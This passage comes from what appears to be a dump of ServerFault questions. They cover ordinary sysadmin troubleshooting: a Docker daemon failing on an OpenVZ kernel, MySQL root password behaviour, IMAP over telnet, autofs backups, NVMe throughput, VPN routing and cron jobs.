VERSION=""16.04.5 LTS (Xenial Xerus)""
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=""Ubuntu 16.04.5 LTS""
VERSION_ID=""16.04""
HOME_URL=""http://www.ubuntu.com/""
SUPPORT_URL=""http://help.ubuntu.com/""
BUG_REPORT_URL=""http://bugs.launchpad.net/ubuntu/""
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
</code></pre>

<p>Kernel Version:</p>

<pre><code>Linux 4.4.0-042stab134.8 x86_64
</code></pre>

<p>When I run the last installation step (
<code>sudo apt-get install docker-ce</code>)</p>

<p>In the Terminal following message occurs:</p>

<pre><code>A dependency job for docker.service failed. See 'journalctl -xe' for details. docker service couldn't start.
</code></pre>

<p>journalctl -xe gives following output:
J</p>

<pre><code>an 08 18:02:21 euve264780 sudo[618]: pam_unix(sudo:session): session opened for
Jan 08 18:02:26 euve264780 sudo[618]: pam_unix(sudo:session): session closed for
Jan 08 18:02:45 euve264780 sudo[621]: micha : TTY=pts/0 ; PWD=/home/micha ; US
Jan 08 18:02:45 euve264780 sudo[621]: pam_unix(sudo:session): session opened for
Jan 08 18:02:48 euve264780 sudo[621]: pam_unix(sudo:session): session closed for
Jan 08 18:02:52 euve264780 sudo[712]: micha : TTY=pts/0 ; PWD=/home/micha ; US
Jan 08 18:02:52 euve264780 sudo[712]: pam_unix(sudo:session): session opened for
Jan 08 18:02:52 euve264780 sudo[712]: pam_unix(sudo:session): session closed for
Jan 08 18:03:01 euve264780 sudo[714]: micha : TTY=pts/0 ; PWD=/home/micha ; US
Jan 08 18:03:01 euve264780 sudo[714]: pam_unix(sudo:session): session opened for
Jan 08 18:03:03 euve264780 sudo[714]: pam_unix(sudo:session): session closed for
Jan 08 18:03:07 euve264780 sudo[898]: micha : TTY=pts/0 ; PWD=/home/micha ; US
Jan 08 18:03:07 euve264780 sudo[898]: pam_unix(sudo:session): session opened for
Jan 08 18:03:08 euve264780 sudo[898]: pam_unix(sudo:session): session closed for
Jan 08 18:03:13 euve264780 sudo[903]: micha : TTY=pts/0 ; PWD=/home/micha ; US
Jan 08 18:03:13 euve264780 sudo[903]: pam_unix(sudo:session): session opened for
Jan 08 18:03:14 euve264780 sudo[903]: pam_unix(sudo:session): session closed for
Jan 08 18:03:19 euve264780 sudo[1004]: micha : TTY=pts/0 ; PWD=/home/micha ; U
Jan 08 18:03:19 euve264780 sudo[1004]: pam_unix(sudo:session): session opened for
Jan 08 18:03:19 euve264780 sudo[1004]: pam_unix(sudo:session): session closed for
Jan 08 18:03:27 euve264780 sudo[1048]: micha : TTY=pts/0 ; PWD=/home/micha ; U
Jan 08 18:03:27 euve264780 sudo[1048]: pam_unix(sudo:session): session opened for
Jan 08 18:03:28 euve264780 sudo[1048]: pam_unix(sudo:session): session closed for
Jan 08 18:03:33 euve264780 sudo[1057]: micha : TTY=pts/0 ; PWD=/home/micha ; U
Jan 08 18:03:33 euve264780 sudo[1057]: pam_unix(sudo:session): session opened for
Jan 08 18:03:35 euve264780 sudo[1057]: pam_unix(sudo:session): session closed for
Jan 08 18:03:37 euve264780 sudo[1241]: micha : TTY=pts/0 ; PWD=/home/micha ; U
Jan 08 18:03:37 euve264780 sudo[1241]: pam_unix(sudo:session): session opened for
Jan 08 18:03:41 euve264780 modprobe[1308]: modprobe: ERROR: …/libkmod/libkmod.c:
Jan 08 18:03:41 euve264780 modprobe[1308]: modprobe: FATAL: Module overlay not fo
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.247607438Z” l
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249405988Z” l
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249488891Z” l
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249507681Z” l
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249581621Z” l
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249614924Z” l
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249713529Z” l
Jan 08 18:03:41 euve264780 sudo[1241]: pam_unix(sudo:session): session closed for
Jan 08 18:03:51 euve264780 sudo[1322]: micha : TTY=pts/0 ; PWD=/home/micha ; U
Jan 08 18:03:51 euve264780 sudo[1322]: pam_unix(sudo:session): session opened for
Jan 08 18:03:52 euve264780 sudo[1322]: pam_unix(sudo:session): session closed for
Jan 08 18:04:23 euve264780 su[609]: pam_unix(su:session): session closed for user
lines 267-308/308 (END)
Jan 08 18:02:21 euve264780 sudo[618]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:02:26 euve264780 sudo[618]: pam_unix(sudo:session): session closed for user root
Jan 08 18:02:45 euve264780 sudo[621]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-get purge docker-ce
Jan 08 18:02:45 euve264780 sudo[621]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:02:48 euve264780 sudo[621]: pam_unix(sudo:session): session closed for user root
Jan 08 18:02:52 euve264780 sudo[712]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/bin/rm -rf /var/lib/docker
Jan 08 18:02:52 euve264780 sudo[712]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:02:52 euve264780 sudo[712]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:01 euve264780 sudo[714]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-get update
Jan 08 18:03:01 euve264780 sudo[714]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:03 euve264780 sudo[714]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:07 euve264780 sudo[898]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-get install apt-transport-https ca-certificates curl sof
Jan 08 18:03:07 euve264780 sudo[898]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:08 euve264780 sudo[898]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:13 euve264780 sudo[903]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-key add -
Jan 08 18:03:13 euve264780 sudo[903]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:14 euve264780 sudo[903]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:19 euve264780 sudo[1004]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-key fingerprint 0EBFCD88
Jan 08 18:03:19 euve264780 sudo[1004]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:19 euve264780 sudo[1004]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:27 euve264780 sudo[1048]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/add-apt-repository deb [arch=amd64] https://download.docker
Jan 08 18:03:27 euve264780 sudo[1048]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:28 euve264780 sudo[1048]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:33 euve264780 sudo[1057]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-get update
Jan 08 18:03:33 euve264780 sudo[1057]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:35 euve264780 sudo[1057]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:37 euve264780 sudo[1241]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/apt-get install docker-ce
Jan 08 18:03:37 euve264780 sudo[1241]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:41 euve264780 modprobe[1308]: modprobe: ERROR: …/libkmod/libkmod.c:514 lookup_builtin_file() could not open builtin file '/lib/modules/4.4.0-042stab134.8/
Jan 08 18:03:41 euve264780 modprobe[1308]: modprobe: FATAL: Module overlay not found in directory /lib/modules/4.4.0-042stab134.8
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.247607438Z” level=warning msg=""Error while setting daemon root propagation, this is not generally cr
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249405988Z” level=info msg=“libcontainerd: started new containerd process” pid=1316
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249488891Z” level=info msg=“parsed scheme: “unix”” module=grpc
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249507681Z” level=info msg=“scheme “unix” not registered, fallback to default scheme” module=grpc
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249581621Z” level=info msg=""ccResolverWrapper: sending new addresses to cc: [{unix:///var/run/docker
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249614924Z” level=info msg=“ClientConn switching balancer to “pick_first”” module=grpc
Jan 08 18:03:41 euve264780 dockerd[1307]: time=“2019-01-08T18:03:41.249713529Z” level=info msg=“pickfirstBalancer: HandleSubConnStateChange: 0xc4209d5030, CONNECTING” m
Jan 08 18:03:41 euve264780 sudo[1241]: pam_unix(sudo:session): session closed for user root
Jan 08 18:03:51 euve264780 sudo[1322]: micha : TTY=pts/0 ; PWD=/home/micha ; USER=root ; COMMAND=/usr/bin/docker container run hello-world
Jan 08 18:03:51 euve264780 sudo[1322]: pam_unix(sudo:session): session opened for user root by root(uid=0)
Jan 08 18:03:52 euve264780 sudo[1322]: pam_unix(sudo:session): session closed for user root
Jan 08 18:04:23 euve264780 su[609]: pam_unix(su:session): session closed for user micha
</code></pre>

<p>If I run</p>

<pre><code>sudo docker container run hello-world
</code></pre>

<p>I got following output:</p>

<pre><code>Docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
</code></pre>

<p>Anyone an idea?
Thanks a lot</p>
","<ubuntu><docker>","2019-01-09 06:45:34"
"948208","AMD Geode LX linux : how to instruct driver to enable flat panel?","<p><em>Platform : PC/104 with AMD Geode LX CPU with integrated graphics. Buildroot framework, kernel 4.18.10.</em></p>

<p>I am building a custom Linux system with Buildroot. Since I compiled the Geode LX frame buffer driver in the kernel (lxfb), I get a black screen on the flat panel (800x600 LCD), but the VGA output works.</p>

<p>It seems like the driver needs some input, but I can't figure out how to do it. See last struct : <a href=""https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/drivers/video/geode/geodefb.h?h=linux-4.18.y&amp;id=b5c26f97ec4a17c650055c83cfc1f2ee6d8818eb"" rel=""nofollow noreferrer"">https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/drivers/video/geode/geodefb.h?h=linux-4.18.y&amp;id=b5c26f97ec4a17c650055c83cfc1f2ee6d8818eb</a></p>

<p>Can anyone help me ?</p>
","<drivers><linux-kernel>","2019-01-09 07:56:48"
"778116","Installing software for server only on terminal server","<p>I'm in the process of developing software for a Windows based RDP
terminal server consisting of a server.exe for the server and a client.exe for all terminal server users.</p>

<p>I've created an MSI for each. I've installed the server.msi under execute mode and the client.msi under install mode.</p>

<p>After acquiring a client session via RDP, I can see the server.exe has been started for this client session as well as running on the server.</p>

<p>How do I just install the server.msi to install it's files to run on the server only?</p>

<p>Many thanks in advance.</p>
","<terminal-server><windows-terminal-services>","2016-05-20 21:56:23"
"869291","Connecting to Hotmail's IMAP Server using Telnet","<p>Hotmail appears to have two separate IMAP ports:</p>

<pre><code>imap-mail.outlook.com 993
</code></pre>

<p>And:</p>

<pre><code>imap-mail.outlook.com 143
</code></pre>

<p>My guess here is that 143 is unsecured, and 993 is over SSL.  However, when I try to connect over 993:</p>

<pre><code>telnet imap-mail.outlook.com 993
</code></pre>

<p>I just get a blank screen - no acknowledgement or greeting message.  When I try the same thing over 143, I do get a message, but it's encrypted:</p>

<p><a href=""https://i.sstatic.net/8IxNr.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/8IxNr.png"" alt=""ImapLogin""></a></p>

<p>Subsequently, issuing login commands fail:</p>

<pre><code>. LOGIN myaddress@hotmail.co.uk mypassword
</code></pre>

<p>With:</p>

<pre><code>. BAD Command received in Invalid state.
</code></pre>

<p>I can't even enter this on 993 as I don't get the greeting.</p>

<p>Please could someone advise me as to why this is not correctly connection, and possibly advise as to how to remedy the problem?</p>
","<imap><telnet>","2017-08-18 07:54:18"
"869317","Autofs mounted /home/<user> not included in backup","<p>I have autofs mounted shared /home directories setup on server and it is working perfectly, when i need  dir, it is mounted automaticly, when i dont, it is not present. But now i am working on backup scripts and noticed something weird.</p>

<p>In every backup i take, the /home folder on the backup is always empty, or i mean there are no  directories in the /home directory. This is due to the fact that when i am taking a snapshot which i later copy, at that time there are no user directories mounted and therefor they are not included in backup, any suggestions how to fix this problem?</p>
","<backup><snapshot><autofs>","2017-08-18 10:25:03"
"869352","Web server benchmark - explanation of results?","<p>I made a small benchmark, in which I compare Apache HTTP server deployed to the Virtualbox, and Apache HTTP in Docker (official Alpine and Debian based images) deployed to the Virtualbox. The results of average requests per second are in the following image <a href=""https://i.sstatic.net/iPdDr.png"" rel=""nofollow noreferrer"">Results of the Apache HTTP benchmarking</a>.</p>

<p>The question is what cause the performance peaks? </p>

<p>For benchmark was used <em>abc</em> (GWAN) wrapper with weighttp. Settings of VM were updated according to <a href=""http://gwan.com/en_apachebench_httperf.html"" rel=""nofollow noreferrer"">http://gwan.com/en_apachebench_httperf.html</a></p>

<p>Benchmark run with [0-500:3000+10x3] => make 3000 request with concurrency from 0 to 500 (with step 10). Every test repeat for 3 times. Configurations of HTTP servers were untouched (default by install). Virtualbox instances were made via Vagrant (Debian Stretch).</p>

<p>I also expect, the default configuration caused that the native Apache HTTP server was slower (with higher concurrency) than the Docker instance. I made the same test for Nginx and results shown same performance stability of docker instance.</p>

<p>BTW, the conclusion of the comparison: performance differences between docker images based on Alpine and Debian are insignificant.</p>
","<apache-2.4><web-server><docker><benchmark>","2017-08-18 12:33:58"
"989990","Servers with 24 NVMe drives - read throughput","<p>We would like to buy some servers and we are looking into DELL server with 24 NVMe drives (like R740xd2 - 2 socket server) since we need very high read IOPS and throughput. We are however wondering what's the maximal throughput we can achieve with this solution. AFAIK, each NVMe <em>takes</em> 4 PCIe lanes but I am not able to find what's the number of available lanes on these servers. Usually NVMe drives offer around 24 Gbps but I know it is not real that 24 NVMe drives would give us 24 * 24 Gbps in parallel read.</p>

<p>So the question is, what is the throughput we can expect out of server like this while doing parallel read from all drives? I know that we'll probably reach the limit of what CPU can do but I am just wondering what is achievable. Anything around 48 Gbps would be win.</p>
","<ssd><pci-express><nvme>","2019-10-30 17:32:42"
"869513","What does a server need to run a VPN?","<p>I have server from OVH, the HOST-64L, that has an Intel Xeon D-1520 and 64GB DDR4 ECC 2133 MHz ram. I have it configured with three 600GB SAS drives. I believe this is an overshot to sell VPN's. What are the bare minimum needs that a server might have to run decent to good VPNs? The server I have now is not cost effective as I have yet to start selling. Thanks.</p>
","<vpn><centos7>","2017-08-19 17:44:26"
"948563","How can I upload an SSH key to a system that doesn't use passwords?","<p>I would like to create a public/private keypair and upload the public key to a server that I want to log onto.</p>

<p>However, that server has already been configured to allow no password authentication of any kind - only key based authentication is allowed.</p>

<p>How do I upload my public key to that system ?  I have no way to log in ...</p>

<p>Just to be clear - I understand very well how to scp my public key to the remote .ssh/authorized_keys file - that is not the issue - the problem is, if password auth is disabled, how can I get the key to them in the first place ?</p>
","<ssh><security><encryption>","2019-01-11 03:31:31"
"990109","mysql root has password set but it allows blank password","<p>Its a new installation. I ran <code>mysql_secure_installation</code> and set a password.</p>

<p>But I can still login with blank password. If I set <code>-p</code> it accepts my new password but also accepts blank password.</p>

<pre><code>root@newserver:~# mysql -uroot 
Welcome to the MariaDB monitor.  Commands end with ; or \g. Your MariaDB connection id is 46 Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; quit; Bye
</code></pre>

<p>There is only one root user account.</p>

<pre><code>MariaDB [mysql]&gt; select * from user\G
*************************** 1. row ***************************
                  Host: localhost
                  User: root
              Password: *lasdhjkladhailuhhiouaw
           Select_priv: Y
             Insert_priv: Y
           Update_priv: Y
</code></pre>
","<mysql>","2019-10-31 10:34:24"
"869700","Domain Controller etiquette after a crash between Server 2003 & Server 2008","<p>I have 2 domain controllers on a non-Internet connected network running Windows Server 2008 R2. They running RAID 5 on a 8 Hard Drive server. Sometime last week the Boot Sector became corrupt on DC1 and I was unable to recover the server. I am not going to have to rebuild the server. I have been reading about the changes from Server 2003 to Server 2008. DC1 was the main domain controller and now that it won't but it is all falling to DC2. I know that in previous versions of Windows Server you had to make on the primary and one the secondary. Since DC2 does not see DC1 anymore is there anything I need to do to DC2 as it is now the one in control? I am thinking some kind of meta data clean up but I can't find any hard information on what procedure to do. I understand as of Server 2008 domain controllers are on an equal footing and provide replication to each other so they should be the same correct?</p>
","<windows-server-2008-r2><domain-controller>","2017-08-21 12:21:35"
"869749","How to improve bandwidth performance for a vm","<p>I have been told to add additional nics to the VM to improve bandwidth performance. Once they are added what is the best way to team them together for best performance?</p>

<p>I tried the Microsoft bridge and it didn't work very well.</p>

<p>Thanks</p>
","<vmware-esxi><bandwidth>","2017-08-21 16:44:46"
"990260","MySQL Can't set password requirement for root user?","<p>I have just setup a new vps with Ubuntu 18, I did a fresh installation of mysql-server:</p>

<pre><code>sudo apt-get update
sudo apt-get install mysql-server
sudo mysql_secure_installation
</code></pre>

<p>In this menu, I typed in my new root password (and confirm) 
Remove anonymous users? Yes
Disallow root login remotely? Yes
Remove test databases and access to it? Yes
Reload privileges table now? Yes</p>

<p>And done! ...or not</p>

<p>I attempted to login using mysql -u root -p but it kept telling my access denied, for a second I was confused, then I realized I probably needed to login using sudo, so I did.</p>

<p>But now, using ""mysql -u root"" or ""mysql -u root -p"" (using ANY password) I can login just fine?!</p>

<p>I am completely dumbfounded.. I have attempted doing alot of different things, like using a query to alter the root password, but nothing seems to work. I can always log in with any password (or none).. And this is a completely fresh mysql installation (I removed and reinstalled it 3 times now to see if I do something differently..)</p>

<p>The only thing I noticed that seemed different, is that in online tutorials on how to install mysql-server the first question in ""mysql_secure_installation"" it should ask you if you want to set a password for root, which I did not get asked for, just prompted to enter the new password.</p>

<p>I tried googling this issue, but could only find ""solutions"" for the reverse (people either not able to login, or wanting to set an always correct password)</p>

<p>I have no idea where to go from here...</p>
","<mysql><root><ubuntu-18.04>","2019-11-01 13:43:27"
"778625","two CNAME records pointing to the same url","<p>Can I have two CNAME records that point to the same url?</p>

<p>Example: <strong>www</strong> CNAME to my.website.com and <strong>shop</strong> CNAME to my.website.com</p>

<p>Will they both work at the same time?</p>
","<cname-record>","2016-05-24 05:28:22"
"990376","Why Does ""yes"" have drastically different performance on different ditros?","<p>I tested <strong>yes</strong> using <strong>pv</strong> with following command on two different distros :</p>

<pre><code>yes | pv &gt; /dev/null
</code></pre>

<p>Results :</p>

<p><em>Ubuntu 16.04 : 5.83GiB/s</em></p>

<p><em>Centos 7.x : 100MiB/s</em></p>

<p>Here is my Specs:</p>

<p><em>1st distro : Ubuntu Ubuntu 16.04.6 LTS - VM(VMware Workstation) - 4GB ram - 4 CPU- kernel : 4.4.0-166-generic.x86_64</em></p>

<p><em>2nd distro : Centos 7.7.1908 (Core) - VM(Vmware Workstation) - 4GB ram
- 4 CPU- kernel : 3.10.0-1062.4.1.el7.x86_64</em></p>

<p><em>Vmware workstation 15.5 installed on Windows 10</em></p>

<p>I was wondering what is the cause of such difference between these two to write on the ram. </p>

<p>Why is Centos too slow to write on the ram? </p>

<p>or is Ubuntu making mistake on performance monitoring while writing on the ram?</p>
","<ubuntu><centos><performance>","2019-11-03 03:24:22"
"869866","HP PCIe 8GB FC Adapter not visible on Windows Server 2012R2","<p>Anyone who can assist me. </p>

<p>I have a HP Proliant GL360, On Boot, the HP PCIe 8GB FC Adapter drivers are visible. Once logged on the server, when I go to Network Connections, I can't see the adapters.</p>

<p>OS: Windows Server 2012 R2 Datacenter</p>
","<hp-proliant><fibre-channel><pci-express>","2017-08-22 11:23:31"
"948885","D'DNS as Default Gateway","<p>I need a help! I have router A on 1st location and I have router B on 2nd location - they are miles away !! Can I set DDNS domain name of router A -""server"" as default gateway for router B? YES or NO. How to do it; if you can't put DDNS as letters into field of ""default gateway""? Don't ask me why; I just need that-okay THANK YOU !!﻿</p>
","<gateway><ddns>","2019-01-13 21:00:51"
"990446","How can I maintain a secure automated recognition relationship with remote web servers when comcast keeps changing my IPv6 and IPv4 addresses?","<p>It used to be that one's IPv4 would stay the same for months at a time. Now, however, it seems they like to renew your IPs on a near daily basis.</p>

<p>Previous to these shenanigans, during development of a project, I would set the remote system's .htaccess files to accept only my IP and the IPs of my clients.</p>

<p>however, after having a chat with xfinity's ever so unhelpful support staff, I've been notified that there is absolutely zero available method by which I can secure a sustained IP address. Apparently even requesting to have the same IP for an entire day is utterly out of the question.</p>

<p>Google, however uncharacteristically, has yielded nothing but a slew of other customers and developers dealing with a similar issue.</p>

<p>I considered using ngrok, but I don't think they give you an IP address, and if they do it's quite likely shared.</p>

<p>My most recent project is a Shopify app. Shopify apps are nothing but webhooks and www endpoints. With my constantly changing IPs, this has become a near nightmare.</p>

<p>What is everybody else doing these days?</p>

<p>I don't even think there is any way to set an apache .htaccess file to recognize me when my IPs are cycling on a near daily basis.</p>

<p>So - either I'm an idiot and the infamous SE downvote squad will roll through and pummel me into negative points, or this is a valid issue that quite a few others have been wresting with.</p>

<p>Thanks in advance to any help any of you might offer.</p>
","<.htaccess><ipv6><ipv4>","2019-11-04 03:00:28"
"990470","Traffic handling capacity for 1 EC2 instance for t3.2xlarge","<p>Protocol exchange between phone server and IOT device(inter regional). say there are 100000 users and each are requesting or using 12 - 20 times a day may be approximately at the same time(protocols are very small less than 1 KB), so I need to create instances for protocol exchange and auto scaling, each transfer is stored as a log and a backup up-to 1000 GB</p>

<p>here is my instances purchasing idea user -> Route53 -> Elastic Beamstalk - > I am -> RDS -> S3 -> cloud front</p>

<p>I need the traffic handling capacity for 1 EC2 instance for t3.2xlarge - vCPU's 8 - Memory - 32GB i.e I need to know how many request at a time it can handle to estimate the cost by calculating how many EC2 instances I'll be using and also need someone to rectify my instance purchase if any</p>
","<amazon-web-services><amazon-ec2><amazon-s3><elastic-beanstalk><amazon-cloudfront>","2019-11-04 07:36:32"
"869962","What exactly is IOWait","<p>I know that the IOWait metric is the amount of time that a cpu is waiting for IO.</p>

<p>As I understand it IOWait always refers to disc io. But why is that?  Why doesn't network IO, presumably involving bus communication on the local system and IO for the cpu affect IOWait?</p>

<p>Also, can a process wanting to read from a disc cause IOWait?  Or is IO wait always a symptom of a process attempting to write disc?</p>
","<linux><iowait>","2017-08-22 21:45:40"
"869973","Windows 10: Can't ping or connect to a few specific IP addresses","<p>I can connect to everywhere else just fine. I can resolve the DNS to the correct IP. Other devices on the same network, wired and wireless, can connect to these sites without trouble.</p>

<p>Even more confusing, a Linux VM running on the problem machine can connect. I've actually been using <code>socat</code> on that host to proxy my connections, and then it works!</p>

<p>But it's been slowly spreading to more hosts, and some of them I can't configure to use that workaround.</p>

<p><code>ping</code> times out, and so does <code>tracert</code>. Only Windows firewall is running, and it doesn't have any rules about these hosts. Pretty vanilla home network.</p>
","<windows><networking>","2017-08-23 00:10:44"
"948992","Administrators lost access to network drive and remote desktop Windows Server 2008","<p>Three days ago, all the users with administrator role could not connect to our server (Windows Server 2008 R2) via network drive or remote desktop, while general users could apply these functions as usual. The administrators can still log in at the server machine directly. The security setting of the drives and the setting of the remote desktop control are alright. The only thing altered that day was that there was a Windows update of MS SQL Server 2014. </p>

<p>What should I check? Many thanks in advance for any advise! </p>
","<windows-server-2008-r2><administrative-privileges>","2019-01-14 14:38:25"
"990519","Is this application a data vault, data mart or data warehouse?","<p>I am importing information from various source systems and putting them into local databases for reporting. For example, one of the sources is Google Analytics.</p>

<p>Here are some attributes of this import process:</p>

<ol>
<li>I am collecting data from the source system (e.g. Google Analytics).</li>
<li>The data goes into my local database.</li>
<li>The data flows in one direction, i.e. the only write access on the local database is the importer process.</li>
<li>The local database is a view of the source system. i.e. it is not a full-fidelity copy of the upstream database.</li>
</ol>

<p>Given these attributes, would my local database be called a data mart, data vault or data warehouse?</p>

<p><em>This word choice is important to me because our company will be publishing our tools as open source. If we describe what our tool does using the best industry-accepted terminology then it will be more valuable.</em></p>
","<database><data-warehouse>","2019-11-04 14:44:01"
"870043","How to create extra root user?","<p>I have tried making a root2 user which should have the same permissions as root by doing</p>

<pre><code>useradd -g root root2
passwd root2
usermod -G root root2
usermod -aG wheel root2
</code></pre>

<p>but root2 can still not cat /etc/shadow as an example.</p>

<p>How can I create such user?</p>
","<linux><permissions><bash><user-management><users>","2017-08-23 12:26:44"
"778702","Google-2fa: How to recover an account when emergency codes are not available?","<p>There's a server in my company which is configured with Google two-factor authentication.</p>

<p>A user from the company has lost his phone and can't find his emergency codes.</p>

<p>What can be done in order to recover his account?</p>

<p>Is is possible to enforce 2FA on specific groups in the server?</p>
","<google-authenticator><two-factor-authentication>","2016-05-24 12:47:47"
"949061","One server, multiple subdomains pointing to different ports","<p>I have a VPN network at home, which I'm using for multiple things.</p>

<p>I'm running the OpenVPN Server on there, alongside multiple http servers, like Jenkins, WebLogic, etc., and a DNS server, which resolves <code>ropi.io</code> to the VPN server.</p>

<p>Knowing what port let's say Jenkins runs on (8081), I can reach it by going to <code>ropi.io:8081</code>, which is call and all, but I'd like to reach that server at <code>jenkins.ropi.io</code> instead. Now, I know that it cannot be solved with pure DNS and whatever I read about reverse proxies, it seems like the solution is not really in that direction.</p>

<p>The best way I'd think it could be solved is to register a separate IP address for all the servers I'm running and creating a DNS entry for each of them. It sounds like a good solution, but I don't know how I could go about doing it.</p>

<p>Is there any sense to my idea? What can I do to make it a reality? If it makes no sense, then where should I look for the solution?</p>

<p>UI.: The servers I'm trying to create subdomains for are running on separate Docker containers. I thought this might be a helpful info.</p>
","<domain-name-system><vpn><subdomain>","2019-01-14 23:12:17"
"778766","Provision a virtual server within CentOS 7?","<p>This may be a really silly question, but I currently have a dedicated server and I have an incredible amount of redundant hardware.</p>

<p>I'd like to be able to provision virtual servers running various operating systems so that I can add/remove them as I want them or no longer want them. I'd like to be able to also provision a virtual server, do something that I'd like to do on the main server to validate whether it would work or not and then be able to destroy it as though it were never there.</p>

<p>The system specs are a Xeon E3 1225 v2, 32GB RAM, 2x2TB of Disc Space and I currently have 5 additional IP addresses at my disposal running an installation of Virtualmin for server management. All 5 IPs are fully configured to resolve at the server's address and can be used to access the server.</p>

<p>I've read about KVM, but there are no clear instructions on how to actually provision a server and login via SSH for example.</p>

<p>Help me out please :)</p>

<p>Thank you in advance, people.</p>
","<linux><centos><virtualization><kvm-virtualization>","2016-05-24 17:21:26"
"870145","Unexpectedly able to delete storage container having running VHDs","<p>Today I deleted an Azure storage container that contained some <code>.vhd</code>s page blobs.</p>

<p>Some of the blobs were the source for some VM disks that were attached to <em>running</em> VM's. </p>

<p>I was surprised that the delete operation worked and even more surprised that the VM's haven't missed a beat.</p>

<p>I shut the VM's down and exported the Disk images successfully.</p>

<p>I've read <strong>a lot</strong> of accounts of people <strong>not able</strong> to delete leased blobs because they were the source of attached disks, but I seem to be experiencing the opposite: it was waaaay too easy to delete the container having these VHD blobs.</p>

<p>What is going on here? Why does everything still work?</p>
","<azure><cloud-storage>","2017-08-23 20:48:33"
"949215","Validate user inputs into a file in Linux","<p>How can I validate user inputs into a file in a Linux system?</p>

<p>For example, can I prevent users from entering '#' or ';' in /etc/passwd?</p>
","<linux>","2019-01-15 18:20:44"
"870258","Windows Update and Hyper-V","<p>We have a Windows SBS2011 that runs an instance of Windows Server 2008 in Hyper-V.</p>

<p>When I check for windows updates in SBS2011, it offers to install the August Security Update for Windows Server 2008 (KB4034664).</p>

<p>Connecting to the 2008 and search for updates there doesn't yield the same result and all I get is an optional update.</p>

<p>Can someone elaborate why it behaves like that?</p>
","<windows-server-2008><hyper-v><windows-update><windows-sbs-2011>","2017-08-24 12:21:00"
"870260","How to access internet when connected to a remote VPN","<p>I am trying to synchronize to databases. One is MySQL (slave) that is accessible via normal internet connection. The other is a MSSQL(Master) database that is only accessible via VPN. I have the VPN connection established (External VPN) and active in windows and the synchronization software can connect to the MSSQL instance (Only when VPN connection is active). The trouble I am having is that I cannot connect to the MySQL database when the VPN connection is active. On the other hand, when the VPN connection is disabled and I am using a normal connection, I can access the MySQL database but not the MSSQL database. It seems like I would need to have both DB's either using the VPN or Standard Internet connection. Is there a way around this? </p>

<p>P.S: I am not a network specialist or DBA. Please try and be descriptive. </p>

<p>Any help would be appreciated! Thanks in advance</p>
","<sql-server><vpn>","2017-08-24 12:27:54"
"778963","How to setup a forward lookup zone for a external IP","<p>I have a external ip address and have configure the NAT on the router. I am just wanting to know how you setup the External Forward lookup zone and what I need to do with regards to fqdn, do I need just add the external ip in there?</p>
","<domain-name-system><external-ip>","2016-05-25 13:22:49"
"870340","Trouble getting cronjob to work","<p>I am having troubles getting a cronjob on ubuntu 16.04 digital ocean to work. </p>

<p>I programmed a python spider, which i want to run every 5 minutes. In order to run this spider I made a script runmyspider.sh (chmod +x) with the command:</p>

<pre><code>scrapy runspider aspider.py
</code></pre>

<p>Now I want to call this script via Cron. </p>

<pre><code>*/5 * * * * sh /scripts/runmyspider.sh 2&gt;&amp;1 /scripts/spider.log
</code></pre>

